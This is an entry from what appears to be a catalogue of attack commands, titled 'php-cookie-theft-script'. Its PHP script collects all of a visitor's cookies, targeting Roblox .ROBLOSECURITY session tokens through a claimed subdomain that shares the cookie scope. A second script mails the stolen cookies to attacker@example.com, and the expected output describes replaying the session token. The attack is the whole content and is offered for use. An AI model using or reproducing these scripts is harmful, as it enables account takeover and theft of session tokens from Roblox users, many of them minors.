---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
data: >-
  <?php echo "Cookies received: <br>"; foreach($_COOKIE as $key => $val) { echo
  "Set-Cookie: $key=$val; Domain=.roblox.com; path=/<br>\n"; } ?>
tags:
  - cookie-theft
type: command
output: 'HTML output listing all cookies in Set-Cookie format, including .ROBLOSECURITY'
executor: php
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T04:39:01.997Z'
verified: false
validated: true
submitted: true
---
# php-cookie-theft-script

## Command

```php
<?php echo "Cookies received: <br>"; foreach($_COOKIE as $key => $val) { echo "Set-Cookie: $key=$val; Domain=.roblox.com; path=/<br>\n"; } ?>
```

## Description

This PHP script enumerates all incoming HTTP cookies from a visitor's browser and outputs them in a formatted string, facilitating theft of session tokens like .ROBLOSECURITY when hosted on a subdomain with shared cookie scope.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_COOKIE | Array of all browser-sent cookies (e.g., .ROBLOSECURITY=token) | Yes |

## Examples

### Basic Usage

Host as index.php on a web server:

```php
<?php echo "Cookies received: <br>"; foreach($_COOKIE as $key => $val) { echo "Set-Cookie: $key=$val; Domain=.roblox.com; path=/<br>\n"; } ?>
```

### Advanced Usage

Add exfiltration (e.g., email or log):

```php
<?php $cookies = ''; foreach($_COOKIE as $key => $val) { $cookies .= "$key=$val;"; } mail('attacker@example.com', 'Stolen Cookies', $cookies); echo "Check email"; ?>
```

## Expected Output

HTML page displaying: Cookies received: <br> Set-Cookie: .ROBLOSECURITY=abc123; Domain=.roblox.com; path=/<br>
Set-Cookie: other_cookie=value; ... Attacker can copy the token for session replay.

## Related

- [[Related Procedure: Claim Subdomain and Host Malicious Content]]
